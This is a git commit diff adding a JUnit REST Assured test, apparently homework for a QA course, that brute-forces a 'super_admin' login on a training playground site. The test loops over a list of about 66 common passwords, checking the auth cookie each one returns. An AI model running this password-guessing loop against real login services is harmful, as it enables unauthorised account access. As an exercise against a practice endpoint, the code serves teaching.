1dbb6a0cf2ed0409da82a9d1bdaf2a38ed18b3b4
Yaremenko-R <roman.jaremenko@gmail.com>
2022-09-20 12:36:16 +0300

    L2_Ex9* testBruteForse() added

--- src/test/java/HelloWorldTest.java
+++ src/test/java/HelloWorldTest.java
@@ -4,6 +4,9 @@ import io.restassured.response.Response;
 import org.junit.jupiter.api.Assertions;
 import org.junit.jupiter.api.Test;
 
+import java.util.ArrayList;
+import java.util.List;
+
 import static org.junit.jupiter.api.Assertions.assertEquals;
 
 public class HelloWorldTest {
@@ -91,5 +94,103 @@ public class HelloWorldTest {
         String result = response3.getString("result");
         Assertions.assertFalse(result.isEmpty());
         System.out.println((result));
+    }
+
+    @Test
+    public void testBruteForse() {
+
+        List<String> passwords = new ArrayList<>();
+        passwords.add("123456");
+        passwords.add("12345678");
+        passwords.add("123456789");
+        passwords.add("password");
+        passwords.add("qwerty");
+        passwords.add("abc123");
+        passwords.add("12345");
+        passwords.add("football");
+        passwords.add("1234567");
+        passwords.add("monkey");
+        passwords.add("letmein");
+        passwords.add("dragon");
+        passwords.add("baseball");
+        passwords.add("1234");
+        passwords.add("sunshine");
+        passwords.add("iloveyou");
+        passwords.add("trustno1");
+        passwords.add("princess");
+        passwords.add("adobe123");
+        passwords.add("123123");
+        passwords.add("welcome");
+        passwords.add("login");
+        passwords.add("admin");
+        passwords.add("qwerty123");
+        passwords.add("1234567890");
+        passwords.add("1q2w3e4r");
+        passwords.add("master");
+        passwords.add("666666");
+        passwords.add("photoshop");
+        passwords.add("1qaz2wsx");
+        passwords.add("qwertyuiop");
+        passwords.add("ashley");
+        passwords.add("mustang");
+        passwords.add("121212");
+        passwords.add("starwars");
+        passwords.add("654321");
+        passwords.add("bailey");
+        passwords.add("access");
+        passwords.add("flower");
+        passwords.add("555555");
+        passwords.add("passw0rd");
+        passwords.add("shadow");
+        passwords.add("lovely");
+        passwords.add("7777777");
+        passwords.add("michael");
+        passwords.add("!@#$%^&*");
+        passwords.add("jesus");
+        passwords.add("password1");
+        passwords.add("superman");
+        passwords.add("hello");
+        passwords.add("charlie");
+        passwords.add("888888");
+        passwords.add("696969");
+        passwords.add("freedom");
+        passwords.add("aa123456");
+        passwords.add("qazwsx");
+        passwords.add("ninja");
+        passwords.add("azerty");
+        passwords.add("loveme");
+        passwords.add("whatever");
+        passwords.add("donald");
+        passwords.add("batman");
+        passwords.add("zaq1zaq1");
+        passwords.add("Football");
+        passwords.add("000000");
+        passwords.add("123qwe");
+
+        for (String password : passwords) {
+
+            Response responseForGetAuthCookie = RestAssured
+                    .given()
+                    .queryParam("login", "super_admin")
+                    .queryParam("password", password)
+                    .when()
+                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                    .andReturn();
+
+            System.out.println(password);
+            String responseCookie = responseForGetAuthCookie.getCookie("auth_cookie");
+            System.out.println(responseCookie);
+
+            Response responseForCheckAuthCookie = RestAssured
+                    .given()
+                    .cookie(responseCookie)
+                    .when()
+                    .get("https://playground.learnqa.ru/api/check_auth_cookie")
+                    .andReturn();
+
+            responseForCheckAuthCookie.print();
+            System.out.println("_____________________");
+
+        }
     }
 }
